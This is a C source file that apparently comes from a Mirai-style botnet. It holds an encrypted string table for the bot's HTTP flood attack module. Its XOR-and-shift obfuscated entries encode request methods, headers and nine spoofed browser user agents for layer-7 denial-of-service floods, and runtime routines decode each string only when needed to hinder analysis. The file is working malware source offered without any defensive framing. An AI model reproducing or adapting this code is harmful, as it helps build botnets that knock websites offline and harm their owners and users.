#ifdef DEBUG
#include <stdio.h>
#endif
#include <stddef.h>
#include <stdlib.h>
#include <string.h>

#include "includes.h"
#include "enc.h"
#include "utils.h"

static uint32_t key = 0xE0A4CBD6;
static uint16_t shift = 4;

static struct table_entry_t **table_entrys = {NULL};
static int table_entrys_len = 0;

static void add_entry(uint8_t id, uint8_t *value, uint8_t value_len) {
	struct table_entry_t *entry = malloc(sizeof(struct table_entry_t));
	entry->id = id;
	entry->enc_value = malloc((value_len+1)*sizeof(unsigned char));
	entry->dec_value = malloc((value_len+1)*sizeof(unsigned char));
	util_strcpy(entry->enc_value, value);
	entry->len = value_len;
	entry->locked = 1;
	table_entrys = realloc(table_entrys, (table_entrys_len+1)*sizeof(struct table_entry_t *));
	table_entrys[table_entrys_len] = entry;
	table_entrys_len++;
}

void enc_init(void) {
	add_entry(TABLE_EXEC_STRING, "\x06\x28\x3C\x34\x2B\x38\x7D\x3F\x2A\x21\x7D\x31\x30\x2D\x29\x2A\x24\x30\x31\x39\x2F\x39\x2B\x5D", 24);
	add_entry(TABLE_RAND_ALPHASET, "\x3C\x3F\x3E\x31\x30\x33\x32\x35\x34\x37\x36\x29\x28\x2B\x2A\x2D\x2C\x2F\x2E\x21\x20\x23\x22\x25\x24\x27\x1C\x1F\x1E\x11\x10\x13\x12\x15\x14\x17\x16\x09\x08\x0B\x0A\x0D\x0C\x0F\x0E\x01\x5D", 47);
	add_entry(TABLE_ATTK_L7_TYPE_GET, "\x12\x10\x01\x5D", 4);// GET
	add_entry(TABLE_ATTK_L7_TYPE_POST, "\x0D\x0A\x0E\x01\x5D", 5);// POST
	add_entry(TABLE_ATTK_L7_TYPE_HEAD, "\x15\x10\x1C\x11\x5D", 5);// HEAD
	add_entry(TABLE_ATTK_L7_CONN_KEEP_ALIVE, "\x36\x30\x30\x2D\x68\x3C\x29\x34\x23\x30\x5D", 11);// "keep-alive"
	add_entry(TABLE_ATTK_L7_CONN_CLOSE, "\x3E\x29\x2A\x2E\x30\x5D", 6);// close
	add_entry(TABLE_ATTK_L7_UA_0, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x09\x34\x2B\x20\x25\x66\x7D\x1C\x2B\x31\x2F\x2A\x34\x31\x7D\x65\x6B\x6D\x6B\x6D\x66\x7D\x0E\x08\x68\x12\x64\x63\x6D\x13\x7D\x1F\x20\x34\x29\x31\x6A\x0F\x6C\x63\x0B\x02\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x1E\x35\x2F\x2A\x28\x30\x6A\x63\x6F\x6B\x6D\x6B\x6E\x6F\x6D\x6F\x6B\x65\x61\x7D\x08\x2A\x3F\x34\x29\x30\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x60\x6E\x62\x6B\x6E\x63\x5D", 137);//Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36
	add_entry(TABLE_ATTK_L7_UA_1, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x09\x34\x2B\x20\x25\x66\x7D\x1C\x2B\x31\x2F\x2A\x34\x31\x7D\x63\x6B\x6D\x66\x7D\x15\x01\x1E\x7D\x0A\x2B\x30\x7D\x05\x6C\x6D\x7D\x1F\x20\x34\x29\x31\x6A\x08\x0F\x1C\x60\x65\x16\x66\x7D\x22\x23\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x03\x30\x2F\x2E\x34\x2A\x2B\x6A\x61\x6B\x6D\x7D\x1E\x35\x2F\x2A\x28\x30\x6A\x63\x6C\x6B\x6D\x6B\x6E\x6C\x63\x6E\x6B\x64\x65\x7D\x08\x2A\x3F\x34\x29\x30\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x60\x6E\x62\x6B\x6E\x63\x5D", 155);//Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36
	add_entry(TABLE_ATTK_L7_UA_2, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x34\x0D\x35\x2A\x2B\x30\x66\x7D\x1E\x0D\x00\x7D\x34\x0D\x35\x2A\x2B\x30\x7D\x0A\x0E\x7D\x6C\x6F\x3A\x6D\x7D\x29\x34\x36\x30\x7D\x08\x3C\x3E\x7D\x0A\x0E\x7D\x05\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x63\x6D\x60\x6B\x6C\x6B\x6C\x60\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x03\x30\x2F\x2E\x34\x2A\x2B\x6A\x6C\x6F\x6B\x6D\x7D\x08\x2A\x3F\x34\x29\x30\x6A\x6C\x60\x10\x6C\x61\x65\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x63\x6D\x61\x6B\x6C\x5D", 136);//Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
	add_entry(TABLE_ATTK_L7_UA_3, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x05\x6C\x6C\x66\x7D\x1E\x2F\x0A\x0E\x7D\x25\x65\x63\x3A\x63\x61\x7D\x65\x6C\x62\x6F\x6B\x61\x60\x6B\x6D\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x1E\x35\x2F\x2A\x28\x30\x6A\x60\x6C\x6B\x6D\x6B\x6F\x62\x6D\x61\x6B\x63\x61\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x60\x6E\x62\x6B\x6E\x63\x5D", 114);//Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
	add_entry(TABLE_ATTK_L7_UA_4, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x02\x34\x2B\x31\x2A\x22\x2E\x7D\x0B\x01\x7D\x63\x6B\x6C\x66\x7D\x02\x0A\x02\x63\x61\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x1E\x35\x2F\x2A\x28\x30\x6A\x61\x62\x6B\x6D\x6B\x6F\x60\x6F\x63\x6B\x6C\x6C\x6C\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x60\x6E\x62\x6B\x6E\x63\x5D", 110);//Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
	add_entry(TABLE_ATTK_L7_UA_5, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x05\x6C\x6C\x66\x7D\x00\x3F\x20\x2B\x21\x20\x66\x7D\x09\x34\x2B\x20\x25\x7D\x25\x65\x63\x3A\x63\x61\x66\x7D\x2F\x23\x67\x6C\x60\x6B\x6D\x74\x7D\x12\x30\x3E\x36\x2A\x6A\x6F\x6D\x6C\x6D\x6D\x6C\x6D\x6C\x7D\x13\x34\x2F\x30\x33\x2A\x25\x6A\x6C\x60\x6B\x6D\x6B\x6C\x5D", 79);//Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1
	add_entry(TABLE_ATTK_L7_UA_6, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x0B\x34\x2B\x21\x30\x2B\x31\x2A\x7D\x02\x34\x34\x00\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x63\x6B\x6E\x6D\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x0B\x05\x6A\x6E\x6B\x6D\x6B\x61\x6B\x6F\x6B\x6C\x6F\x7D\x0B\x34\x2B\x21\x30\x2B\x31\x2A\x1F\x2F\x2A\x22\x2E\x30\x2F\x6A\x61\x6B\x6E\x6B\x6C\x6B\x6C\x6C\x6F\x63\x61\x6B\x00\x0E\x5D", 112);//Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
	add_entry(TABLE_ATTK_L7_UA_7, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x02\x34\x2B\x31\x2A\x22\x2E\x7D\x0B\x01\x7D\x6C\x6D\x6B\x6D\x66\x7D\x02\x34\x2B\x63\x61\x66\x7D\x25\x63\x61\x66\x7D\x05\x1F\x0A\x05\x3A\x0A\x0B\x10\x3A\x10\x11\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x1E\x35\x2F\x2A\x28\x30\x6A\x60\x6C\x6B\x6D\x6B\x6F\x62\x6D\x61\x6B\x62\x64\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x10\x31\x32\x30\x6A\x6C\x61\x6B\x6C\x61\x6E\x64\x6E\x5D", 142);//Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393
	add_entry(TABLE_ATTK_L7_UA_8, "\x08\x2A\x27\x34\x29\x29\x3C\x6A\x60\x6B\x6D\x7D\x75\x02\x34\x2B\x31\x2A\x22\x2E\x7D\x0D\x35\x2A\x2B\x30\x7D\x6C\x6D\x6B\x6D\x66\x7D\x1C\x2B\x31\x2F\x2A\x34\x31\x7D\x61\x6B\x6F\x6B\x6C\x66\x7D\x05\x3F\x2A\x25\x66\x7D\x05\x3F\x2A\x25\x7D\x0A\x2B\x30\x74\x7D\x1C\x2D\x2D\x29\x30\x02\x30\x3F\x16\x34\x21\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x75\x16\x15\x01\x08\x09\x69\x7D\x29\x34\x36\x30\x7D\x12\x30\x3E\x36\x2A\x74\x7D\x1E\x35\x2F\x2A\x28\x30\x6A\x61\x63\x6B\x6D\x6B\x6F\x61\x65\x63\x6B\x6D\x7D\x08\x2A\x3F\x34\x29\x30\x7D\x0E\x3C\x33\x3C\x2F\x34\x6A\x60\x6E\x62\x6B\x6E\x63\x7D\x10\x31\x32\x30\x6A\x6C\x6E\x6B\x6C\x6D\x60\x65\x63\x5D", 157);//"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
	add_entry(TABLE_ATTK_L7_HTTP, "\x7D\x15\x01\x01\x0D\x6A\x6C\x6B\x6C\x39\x2F\x39\x2B\x15\x2A\x2E\x21\x67\x7D\x5D", 20);//" HTTP/1.1\r\nHost: "
	add_entry(TABLE_ATTK_L7_UA, "\x39\x2F\x39\x2B\x00\x2E\x30\x2F\x68\x1C\x32\x30\x2B\x21\x67\x7D\x5D", 17);//"\r\nUser-Agent: "
	add_entry(TABLE_ATTK_L7_ACCEPT, "\x39\x2F\x39\x2B\x1C\x3E\x3E\x30\x2D\x21\x67\x7D\x21\x30\x25\x21\x6A\x35\x21\x28\x29\x69\x3C\x2D\x2D\x29\x34\x3E\x3C\x21\x34\x2A\x2B\x6A\x25\x35\x21\x28\x29\x76\x25\x28\x29\x69\x3C\x2D\x2D\x29\x34\x3E\x3C\x21\x34\x2A\x2B\x6A\x25\x28\x29\x66\x2C\x18\x6D\x6B\x64\x69\x77\x6A\x77\x66\x2C\x18\x6D\x6B\x65\x39\x2F\x39\x2B\x1C\x3E\x3E\x30\x2D\x21\x68\x09\x3C\x2B\x32\x20\x3C\x32\x30\x67\x7D\x30\x2B\x68\x20\x2E\x69\x30\x2B\x66\x2C\x18\x6D\x6B\x60\x39\x2F\x39\x2B\x1C\x3E\x3E\x30\x2D\x21\x68\x10\x2B\x3E\x2A\x31\x34\x2B\x32\x67\x7D\x32\x27\x34\x2D\x69\x31\x30\x33\x29\x3C\x21\x30\x39\x2F\x39\x2B\x1C\x3E\x3E\x30\x2D\x21\x68\x1E\x35\x3C\x2F\x2E\x30\x21\x67\x7D\x14\x0E\x0A\x68\x65\x65\x60\x64\x68\x6C\x69\x20\x21\x33\x68\x65\x66\x2C\x18\x6D\x6B\x62\x69\x77\x66\x2C\x18\x6D\x6B\x62\x39\x2F\x39\x2B\x1E\x2A\x2B\x2B\x30\x3E\x21\x34\x2A\x2B\x67\x7D\x5D", 210);//"\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nConnection: "

}

static void xor(uint8_t *data, int data_len)
{
    int i = 0;
    uint8_t k1 = key & 0xff, k2 = (key >> 8) & 0xff, k3 = (key >> 16) & 0xff, k4 = (key >> 24) & 0xff;

    for(i = 0; i < data_len; i++)
    {
        data[i] ^= k1;
        data[i] ^= k2;
        data[i] ^= k3;
        data[i] ^= k4;
    }

    return;
}

static void shift_enc(uint8_t *data, int data_len)
{
	int i;
	for(i = 0; i < data_len; i++) {
		data[i] += shift;
	}
}

static void shift_dnc(uint8_t *data, int data_len)
{
	int i;
	for(i = 0; i < data_len; i++) {
		data[i] -= shift;
	}
}

static void unlock_entry(uint8_t id) {
	struct table_entry_t *entry = enc_get_entry(id);
	if(entry == NULL) {
	#ifdef DEBUG
		printf("[entry] Failed to unlock entry %d, entry not found\r\n", id);
	#endif
		return;
	}
	char *data = malloc(entry->len+1);
	util_strcpy(data, entry->enc_value);
	xor(data, entry->len);
	shift_dnc(data, entry->len);
	util_strcpy(entry->dec_value, data);
	free(data);
	entry->locked = 0;
}

static void lock_entry(uint8_t id) {
	struct table_entry_t *entry = enc_get_entry(id);
	if(entry == NULL) {
	#ifdef DEBUG
		printf("[entry] Failed to lock entry %d, entry not found\r\n", id);
	#endif
		return;
	}
	if(entry->dec_value != NULL) {
		util_zero(entry->dec_value);
	}
	entry->locked = 1;
}

struct table_entry_t *enc_get_entry(uint8_t id) {
	int x;
	for(x = 0; x < table_entrys_len; x++) {
		if(table_entrys[x]->id != id) continue;
		return table_entrys[x];
	}
	return NULL;
}

char *enc_get_entry_str(struct table_entry_t *entry) {
	char *ret = NULL;
	unlock_entry(entry->id);
	#ifdef DEBUG
	printf("[enc/%d] got table entry %s\r\n", entry->id, entry->dec_value);
	#endif
	ret = malloc(entry->len);
	util_strcpy(ret, entry->dec_value);
	lock_entry(entry->id);
	return ret;
}

void enc_free_value(char *value) {
	if(value!= NULL) {
		free(value);
	}
}
